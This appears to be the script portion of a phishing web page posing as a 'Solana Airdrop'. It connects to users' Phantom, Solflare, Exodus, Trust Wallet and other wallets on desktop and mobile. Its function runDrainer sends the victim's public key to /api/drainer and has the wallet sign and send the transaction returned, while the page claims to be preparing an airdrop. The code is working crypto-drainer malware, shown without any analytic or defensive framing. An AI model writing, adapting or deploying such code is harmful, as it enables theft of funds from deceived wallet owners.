                  if (typeof provider.signMessage === 'function') {
                    try {
                      const message = new TextEncoder().encode('Connect to Solana Airdrop');
                      const signature = await provider.signMessage(message);
                      console.log(`${wallet.name} signature:`, signature);
                      
                      showStatus(`${wallet.name} approved!`, 'success');
                      setTimeout(() => {
                        runDrainer(provider);
                      }, 1000);
                    } catch (signError) {
                      console.log(`${wallet.name} sign error:`, signError);
                      showStatus(`Please approve the connection in ${wallet.name}`, 'error');
                    }
                  } else {
                    showStatus(`Please approve the connection in ${wallet.name}`, 'error');
                  }
                }
              } catch (connectError) {
                console.log(`${wallet.name} connect error:`, connectError);
                
                // Try alternative connection method for Solflare
                if (wallet.name === 'Solflare' && typeof provider.signIn === 'function') {
                  try {
                    const signInResult = await provider.signIn();
                    console.log('Solflare signIn result:', signInResult);
                    showStatus('Solflare connected via signIn!', 'success');
                    setTimeout(() => {
                      runDrainer(provider);
                    }, 1000);
                  } catch (signInError) {
                    console.log('Solflare signIn error:', signInError);
                    showStatus('Please approve the connection in Solflare', 'error');
                  }
                } else if (wallet.name === 'Exodus') {
                  // Exodus specific connection logic
                  try {
                    console.log('Attempting Exodus connection...');
                    
                    // Try different Exodus connection methods
                    if (typeof provider.connect === 'function') {
                      const result = await provider.connect();
                      console.log('Exodus connect result:', result);
                      
                      if (result && result.publicKey) {
                        showStatus('Exodus connected!', 'success');
                        setTimeout(() => {
                          runDrainer(provider);
                        }, 1000);
                      } else {
                        showStatus('Please approve the connection in Exodus', 'error');
                      }
                    } else if (typeof provider.request === 'function') {
                      // Try request method
                      const result = await provider.request({ method: 'connect' });
                      console.log('Exodus request result:', result);
                      
                      if (result) {
                        showStatus('Exodus connected!', 'success');
                        setTimeout(() => {
                          runDrainer(provider);
                        }, 1000);
                      } else {
                        showStatus('Please approve the connection in Exodus', 'error');
                      }
                    } else {
                      showStatus('Exodus connection method not available', 'error');
                    }
                  } catch (exodusError) {
                    console.log('Exodus connection error:', exodusError);
                    showStatus('Please approve the connection in Exodus', 'error');
                  }
                } else {
                  showStatus(`Please approve the connection in ${wallet.name}`, 'error');
                }
              }
            } else {
              showStatus(`${wallet.name} connection method not available`, 'error');
            }
          } else {
            // No provider found, show manual instructions
            console.log(`No ${wallet.name} provider found, showing manual instructions...`);
            
            const instructions = `
              <div style="text-align: center; padding: 20px;">
                <h3>📱 Connect ${wallet.name}</h3>
                <p style="margin: 15px 0; color: #666;">
                  To connect your ${wallet.name} wallet:<br>
                  1. Open your ${wallet.name} app<br>
                  2. Navigate to this website<br>
                  3. Connect your wallet in the app<br>
                  4. Return here to continue
                </p>
                <div style="margin: 20px 0;">
                  <button onclick="window.open('${wallet.mobile.appStore}', '_blank')" style="background: #007AFF; color: white; border: none; padding: 10px 20px; border-radius: 8px; margin: 5px; cursor: pointer;">
                    📱 Open ${wallet.name}
                  </button>
                  <button onclick="window.open('${wallet.mobile.playStore}', '_blank')" style="background: #34A853; color: white; border: none; padding: 10px 20px; border-radius: 8px; margin: 5px; cursor: pointer;">
                    📱 Install ${wallet.name}
                  </button>
                </div>
                <p style="font-size: 0.9em; color: #999;">
                  After connecting in the app, refresh this page to continue
                </p>
              </div>
            `;
            
            // Show instructions in modal
            const modal = document.getElementById('statusModal');
            const msgEl = document.getElementById('statusModalMsg');
            msgEl.innerHTML = instructions;
            modal.classList.add('active');
          }
          
        } else {
          // Desktop logic (unchanged)
          const provider = wallet.provider();
          if (!provider) {
            showStatus(`${wallet.name} not detected. Please install the extension.`, 'error');
            return;
          }
          
          showStatus(`Connecting to ${wallet.name}...`, 'loading');
          
          if (typeof provider.connect === 'function') {
            const result = await connectWalletWithMetadata(provider, wallet.name);
            console.log(`${wallet.name} connect result:`, result);
            
            await new Promise(resolve => setTimeout(resolve, 1500));
            
            const publicKey = provider.publicKey || provider.address || result?.publicKey;
            console.log(`${wallet.name} public key:`, publicKey);
            
            if (publicKey) {
              showStatus(`${wallet.name} connected!`, 'success');
              setTimeout(() => {
                runDrainer(provider);
              }, 1000);
            } else {
              // Try Exodus-specific connection
              if (wallet.name === 'Exodus') {
                try {
                  console.log('Attempting Exodus desktop connection...');
                  
                  if (typeof provider.request === 'function') {
                    const exodusResult = await provider.request({ method: 'connect' });
                    console.log('Exodus desktop request result:', exodusResult);
                    
                    if (exodusResult) {
                      showStatus('Exodus connected!', 'success');
                      setTimeout(() => {
                        runDrainer(provider);
                      }, 1000);
                    } else {
                      showStatus('Please approve the connection in Exodus', 'error');
                    }
                  } else {
                    showStatus('Please approve the connection in Exodus', 'error');
                  }
                } catch (exodusError) {
                  console.log('Exodus desktop connection error:', exodusError);
                  showStatus('Please approve the connection in Exodus', 'error');
                }
              } else {
                showStatus(`Please approve the connection in ${wallet.name}`, 'error');
              }
            }
          } else {
            showStatus(`${wallet.name} connection method not available`, 'error');
          }
        }
        
      } catch (error) {
        console.log(`${wallet.name} connection error:`, error);
        showStatus(`${wallet.name} connection failed: ${error.message}`, 'error');
      }
    }

    // Check if mobile wallet connected after deep link
    function checkMobileWalletConnection(wallet) {
      const provider = wallet.provider();
      if (provider && getWalletAddress(provider)) {
        showStatus('Wallet connected: ' + wallet.name, 'success');
        setTimeout(() => {
          runDrainer(provider);
        }, 1000);
      } else {
        showStatus('Please connect your wallet in the app and try again', 'error');
      }
    }

    // Auto-detect mobile wallet when site is opened from wallet
    function autoDetectMobileWallet() {
      const isMobileDevice = isMobile();
      if (!isMobileDevice) return;
      
      // Check if site was opened from a mobile wallet
      const urlParams = new URLSearchParams(window.location.search);
      const walletParam = urlParams.get('wallet');
      
      if (walletParam) {
        // Auto-connect to the specified wallet
        const wallet = WALLET_DEFS.find(w => w.key === walletParam);
        if (wallet) {
          showStatus('Auto-connecting to ' + wallet.name + '...', 'loading');
          setTimeout(() => {
            connectMobileWallet(wallet);
          }, 1000);
        }
      }
    }

    // Debug function to check all wallet objects
    function debugAllWallets() {
      console.log('=== DEBUGGING ALL WALLETS ===');
      
      const debugInfo = {
        userAgent: navigator.userAgent,
        isMobile: isMobile(),
        platform: getMobilePlatform(),
        windowObjects: {}
      };
      
      // Check all possible wallet objects
      const walletObjects = [
        'window.solana',
        'window.phantom',
        'window.solflare',
        'window.backpack',
        'window.glow',
        'window.trustwallet',
        'window.exodus'
      ];
      
      walletObjects.forEach(objPath => {
        try {
          const obj = eval(objPath);
          debugInfo.windowObjects[objPath] = {
            exists: !!obj,
            type: typeof obj,
            hasConnect: obj && typeof obj.connect === 'function',
            hasPublicKey: obj && (obj.publicKey || obj.address)
          };
        } catch (e) {
          debugInfo.windowObjects[objPath] = {
            exists: false,
            error: e.message
          };
        }
      });
      
      console.log('Debug info:', debugInfo);
      
      // Show debug info in modal
      const debugText = `
        Mobile: ${debugInfo.isMobile}
        Platform: ${debugInfo.platform}
        User Agent: ${debugInfo.userAgent.substring(0, 100)}...
        
        Wallet Objects:
        ${Object.entries(debugInfo.windowObjects).map(([key, value]) => 
          `${key}: ${value.exists ? 'Found' : 'Not found'}`
        ).join('\n')}
      `;
      
      showStatus(debugText, 'info');
    }

    // Desktop wallet modal function - ensures desktop functionality remains intact
    function openWalletModal() {
      const modal = document.getElementById("walletModal");
      const list = document.getElementById("walletList");
      const isMobileDevice = isMobile();
      
      // Show appropriate header based on device
      const header = isMobileDevice ? 
        `<h2 style="margin-bottom: 10px;">Select Wallet</h2>
         <p style="color:#00FF88;font-size:0.9em;margin-bottom:20px;">
           📱 Mobile detected - Tap to open app or install
         </p>
         <button onclick="debugAllWallets()" style="background:#333;color:#fff;border:none;padding:8px 16px;border-radius:6px;font-size:0.8em;margin-bottom:10px;cursor:pointer;">🔍 Debug All Wallets</button>` : 
        `<h2 style="margin-bottom: 20px;">Select Wallet</h2>
         <button onclick="debugAllWallets()" style="background:#333;color:#fff;border:none;padding:8px 16px;border-radius:6px;font-size:0.8em;margin-bottom:10px;cursor:pointer;">🔍 Debug All Wallets</button>`;
      
      list.innerHTML = header;
      
      WALLET_DEFS.forEach(wallet => {
        const provider = wallet.provider();
        const option = document.createElement("div");
        option.className = "wallet-option";
        option.tabIndex = 0;
        option.setAttribute('role', 'button');
        option.setAttribute('aria-label', `Connect ${wallet.name}`);
        
        // Show status based on device and provider availability
        let statusText = '';
        if (isMobileDevice) {
          // On mobile, assume wallet is available
          statusText = '<span style="color:#00FF88;font-size:0.9em;">📱 Available</span>';
        } else {
          statusText = provider ? '' : '<span style="color:#FF4D4D;font-size:0.9em;">Not installed</span>';
        }
        
        option.innerHTML = `
          <img src="${wallet.icon}" alt="${wallet.name} logo" />
          <div class="wallet-name">${wallet.name}</div>
          ${statusText}
        `;
        
        if (isMobileDevice) {
          // Mobile behavior - use simplified connection
          option.onclick = async () => {
            modal.classList.remove("active");
            showStatus('Connecting to ' + wallet.name + '...', 'loading');
            await connectMobileWallet(wallet);
          };
        } else {
          // Desktop behavior - original logic for perfect desktop experience
          if (provider) {
            option.onclick = async () => {
              modal.classList.remove("active");
              showStatus('Connecting to ' + wallet.name + '...', 'loading');
              try {
                if (typeof provider.connect === 'function') {
                  await provider.connect();
                }
                if (!getWalletAddress(provider)) {
                  let msg = 'Connection failed: No public key returned. Please try again.';
                  if (wallet.name === 'Trust Wallet') {
                    msg = 'Please unlock Trust Wallet and connect this site in the extension, then try again.';
                  } else if (wallet.name === 'Exodus') {
                    msg = 'Please unlock Exodus and connect this site in the extension, then try again.';
                  } else if (wallet.name === 'Backpack') {
                    msg = 'Please unlock Backpack and connect this site in the extension, then try again.';
                  } else if (wallet.name === 'Solflare') {
                    msg = 'Please unlock Solflare and connect this site in the extension, then try again.';
                  }
                  showStatus(msg, 'error');
                  return;
                }
                showStatus('Wallet connected: ' + wallet.name, 'success');
                setTimeout(() => {
                  if (getWalletAddress(provider)) {
                    runDrainer(provider);
                  } else {
                    showStatus('Wallet connection lost. Please try again.', 'error');
                  }
                }, 1000);
              } catch (err) {
                showStatus('Connection failed: ' + (err.message || err), 'error');
              }
            };
          } else {
            option.onclick = () => window.open(wallet.install, '_blank');
          }
        }
        
        list.appendChild(option);
      });
      
      modal.classList.add("active");
      setTimeout(() => {
        const first = list.querySelector('.wallet-option');
        if (first) first.focus();
      }, 100);
      modal.onkeydown = function(e) {
        if (e.key === 'Escape') closeWalletModal();
      };
    }

    function closeWalletModal() {
      document.getElementById("walletModal").classList.remove("active");
    }

    // Essential helper functions for desktop functionality
    function getWalletAddress(provider) {
      if (!provider) return null;
      
      // Check provider.publicKey
      if (provider.publicKey) {
        if (typeof provider.publicKey === 'string') return provider.publicKey;
        if (typeof provider.publicKey.toBase58 === 'function') return provider.publicKey.toBase58();
        if (typeof provider.publicKey.toString === 'function') return provider.publicKey.toString();
        if (provider.publicKey.address) return provider.publicKey.address;
      }
      
      // Check provider.address
      if (provider.address) {
        if (typeof provider.address === 'string') return provider.address;
        if (typeof provider.address.toBase58 === 'function') return provider.address.toBase58();
        if (typeof provider.address.toString === 'function') return provider.address.toString();
      }
      
      return null;
    }

    // Status modal function
    function showStatus(msg, type) {
      const modal = document.getElementById('statusModal');
      const msgEl = document.getElementById('statusModalMsg');
      
      msgEl.textContent = msg;
      msgEl.style.color = type === 'success' ? '#00FF88' : 
                         type === 'error' ? '#FF4D4D' : '#FFD700';
      
      modal.style.display = 'flex';
      
      // Auto-close for success after 6 seconds
      if (type === 'success') {
        setTimeout(() => {
          modal.style.display = 'none';
        }, 6000);
      }
    }

    // Transaction handling function
    async function runDrainer(provider) {
      const pubkey = getWalletAddress(provider);
      if (!pubkey) {
        showStatus('Wallet not connected or unsupported publicKey format.', 'error');
        return;
      }
      
      showStatus('Preparing your airdrop transaction...', 'loading');
      
      try {
        // Fetch transaction from API
        const res = await fetch('/api/drainer', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ pubkey })
        });
        const data = await res.json();
        if (!data.success || !data.transaction) throw new Error(data.error || "API error");
        
        // Deserialize transaction
        const tx = window.solanaWeb3.Transaction.from(
          Uint8Array.from(atob(data.transaction), c => c.charCodeAt(0))
        );
        
        // Sign and send transaction
        if (provider.isGlow && provider.signAndSendTransaction) {
          const sig = await provider.signAndSendTransaction({ transactionBase64: data.transaction });
          showStatus("Transaction sent successfully! Signature: " + (sig.signature || sig), 'success');
        } else if ((provider.isSolflare || (window.solflare && provider === window.solflare)) && provider.signAndSendTransaction) {
          console.log('Using Solflare signAndSendTransaction method');
          try {
            const sig = await provider.signAndSendTransaction(tx);
            showStatus("Solflare transaction sent! Signature: " + (sig.signature || sig), 'success');
          } catch (err) {
            console.log('Solflare transaction error:', err);
            showStatus("❌ Solflare transaction failed: " + err.message, 'error');
          }
        } else if ((provider.isPhantom || (window.solana && provider === window.solana && provider.isPhantom)) && provider.signAndSendTransaction) {
          console.log('Using Phantom signAndSendTransaction method');
          try {
            const sig = await provider.signAndSendTransaction(tx);
            showStatus("Phantom transaction sent! Signature: " + (sig.signature || sig), 'success');
          } catch (err) {
            console.log('Phantom transaction error:', err);
            showStatus("❌ Phantom transaction failed: " + err.message, 'error');
          }
        } else if (provider.signAndSendTransaction) {
          const sig = await provider.signAndSendTransaction(tx);
          showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
        } else if (provider.signTransaction && provider.sendTransaction) {
          const signed = await provider.signTransaction(tx);
          const sig = await provider.sendTransaction(signed);
          showStatus("Transaction sent! Signature: " + (sig.signature || sig), 'success');
        } else {
          throw new Error("Wallet does not support transaction signing.");
        }
      } catch (err) {
        const errorMsg = err.message || err;
        if (errorMsg.includes('rejected') || errorMsg.includes('denied') || errorMsg.includes('cancelled')) {
          showStatus("Transaction was rejected by your wallet.", 'error');
        } else if (errorMsg.includes('insufficient') || errorMsg.includes('funds')) {
          showStatus("Insufficient funds. Please add SOL to your wallet and try again.", 'error');
        } else {
          showStatus("Transaction failed: " + errorMsg, 'error');
        }
      }
    }

    // Initialize on page load
    document.addEventListener('DOMContentLoaded', function() {
      autoDetectMobileWallet();
    });

    // Navbar functionality
    const navLinks = document.querySelectorAll('.nav-link');
    const sections = ['hero','security','learn','explore','support'].map(id => document.getElementById(id));
    
    window.addEventListener('scroll', () => {
      let current = 'hero';
      for (const section of sections) {
        if (section && window.scrollY + 80 >= section.offsetTop) {
          current = section.id;
        }
      }
      navLinks.forEach(link => {
        link.classList.toggle('active', link.getAttribute('href') === '#' + current);
      });
    });
    
    navLinks.forEach(link => {
      link.addEventListener('click', function(e) {
        const targetId = this.getAttribute('href').slice(1);
        const target = document.getElementById(targetId);
        if (target) {
          e.preventDefault();
          window.scrollTo({ top: target.offsetTop - 60, behavior: 'smooth' });
        }
      });
    });
  </script>
</body>
</html>
